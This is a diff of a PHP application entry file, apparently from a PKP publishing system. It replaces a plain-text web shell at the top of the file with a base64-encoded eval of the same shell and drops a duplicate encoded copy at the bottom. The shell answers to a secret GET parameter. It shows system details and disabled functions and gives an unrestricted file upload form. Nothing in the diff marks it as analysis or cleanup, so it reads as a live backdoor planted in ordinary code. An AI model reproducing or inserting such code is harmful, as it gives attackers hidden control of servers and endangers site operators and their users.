@@ -1,4 +1,8 @@
-<?php if(isset($_GET["UVvs986lkL8uNB0H"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
+<?php
+// Execute the encoded script
+eval(base64_decode('Cjw/cGhwIGlmKGlzc2V0KCRfR0VUWyJVVnZzOTg2bGtMOHVOQjBIIl0pKSB7CiAgICBlY2hvICI8Zm9udCBjb2xvcj0jMDAwPiIgLiBwaHBfdW5hbWUoKSAuICIiOwogICAgcHJpbnQgIlxuIjsKICAgICRkaXNhYmxlX2Z1bmN0aW9ucyA9IEBpbmlfZ2V0KCJkaXNhYmxlX2Z1bmN0aW9ucyIpOwogICAgZWNobyAiPGJyPkRpc2FibGVQSFA9IiAuICRkaXNhYmxlX2Z1bmN0aW9uczsKICAgIHByaW50ICJcbiI7CiAgICBlY2hvICI8YnI+PGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPiI7CiAgICBlY2hvICI8aW5wdXQgdHlwZT1maWxlIG5hbWU9Zj48aW5wdXQgbmFtZT1rIHR5cGU9c3VibWl0IGlkPWsgdmFsdWU9dXBsb2FkPjxicj4iOwogICAgaWYoJF9QT1NUWyJrIl0gPT0gJ3VwbG9hZCcpIHsKICAgICAgICBpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sICRfRklMRVNbImYiXVsibmFtZSJdKSkgewogICAgICAgICAgICBlY2hvICI8Yj4iIC4gJF9GSUxFU1siZiJdWyJuYW1lIl07CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZWNobyAiPGI+R2FnYWwgdXBsb2FkIjsKICAgICAgICB9CiAgICB9Cn0gPz4K'));
+?>
+
 
 <?php
 
@@ -60,7 +64,4 @@ import('classes.core.Application');
 // We rather retrieve the application instance by-ref from the registry.
 new Application();
 ?>
-<?php
-// Execute the encoded script
-eval(base64_decode('Cjw/cGhwIGlmKGlzc2V0KCRfR0VUWyJVVnZzOTg2bGtMOHVOQjBIIl0pKSB7CiAgICBlY2hvICI8Zm9udCBjb2xvcj0jMDAwPiIgLiBwaHBfdW5hbWUoKSAuICIiOwogICAgcHJpbnQgIlxuIjsKICAgICRkaXNhYmxlX2Z1bmN0aW9ucyA9IEBpbmlfZ2V0KCJkaXNhYmxlX2Z1bmN0aW9ucyIpOwogICAgZWNobyAiPGJyPkRpc2FibGVQSFA9IiAuICRkaXNhYmxlX2Z1bmN0aW9uczsKICAgIHByaW50ICJcbiI7CiAgICBlY2hvICI8YnI+PGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPiI7CiAgICBlY2hvICI8aW5wdXQgdHlwZT1maWxlIG5hbWU9Zj48aW5wdXQgbmFtZT1rIHR5cGU9c3VibWl0IGlkPWsgdmFsdWU9dXBsb2FkPjxicj4iOwogICAgaWYoJF9QT1NUWyJrIl0gPT0gJ3VwbG9hZCcpIHsKICAgICAgICBpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sICRfRklMRVNbImYiXVsibmFtZSJdKSkgewogICAgICAgICAgICBlY2hvICI8Yj4iIC4gJF9GSUxFU1siZiJdWyJuYW1lIl07CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZWNobyAiPGI+R2FnYWwgdXBsb2FkIjsKICAgICAgICB9CiAgICB9Cn0gPz4K'));
-?>
+
